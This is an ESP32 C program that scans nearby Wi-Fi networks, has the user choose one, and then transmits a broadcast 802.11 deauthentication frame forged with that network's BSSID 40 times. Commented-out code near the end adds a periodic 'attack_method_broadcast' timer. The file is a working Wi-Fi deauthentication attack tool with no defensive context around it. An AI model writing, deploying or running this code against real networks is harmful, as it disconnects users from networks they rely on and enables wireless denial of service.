#include <stdio.h>
#include <string.h>
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define MAX_APs 20
static const char *TAG = "wifi_scan_example";
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

void wifi_scan(void)
{
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
        ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize TCP/IP
    ESP_ERROR_CHECK(esp_netif_init());

    // Create default event loop
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // Initialize Wi-Fi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // Set Wi-Fi mode to STA
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

    // Start Wi-Fi
    ESP_ERROR_CHECK(esp_wifi_start());

    // Configure scan parameters
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    // Start scanning
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));

    // Get AP list
    uint16_t ap_num = MAX_APs;
    wifi_ap_record_t ap_records[MAX_APs];
    memset(ap_records, 0, sizeof(ap_records));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_num, ap_records));

    // List APs
    printf("Found %d access points:\n", ap_num);
    for (int i = 0; i < ap_num; i++) {
        printf("%d. SSID:%s, RSSI:%d\n", i + 1, ap_records[i].ssid, ap_records[i].rssi);
    }

    // User selection
    int choice = 0;
    printf("Enter the number of the network you want to select: ");
    scanf("%d", &choice);

    if (choice > 0 && choice <= ap_num) {
        printf("You selected network %d: %s\n", choice, ap_records[choice - 1].ssid);
        
        // Get the selected AP record
        wifi_ap_record_t selected_ap = ap_records[choice - 1];
        
        // Now you can use selected_ap for further processing
        // For example, you can send a deauth frame to the selected AP
        
        for(int i = 0; i < 40; i++){
            printf("Sending deauth frame to %s\n", selected_ap.ssid);
            wsl_bypasser_send_deauth_frame(&selected_ap);
            vTaskDelay(1000);
        }


    } else {
        printf("Invalid selection.\n");
    }

    // Clean up
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_deinit());
}

void app_main(void)
{
    wifi_scan();
}









//--------------------------------------------------------------
//static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodically called to send deauthentication frame for given AP
 * 
 * @param arg expects wifi_ap_record_t
 */





/*

static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

*/


/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */

/*
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    //ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    //ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

*/




/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */





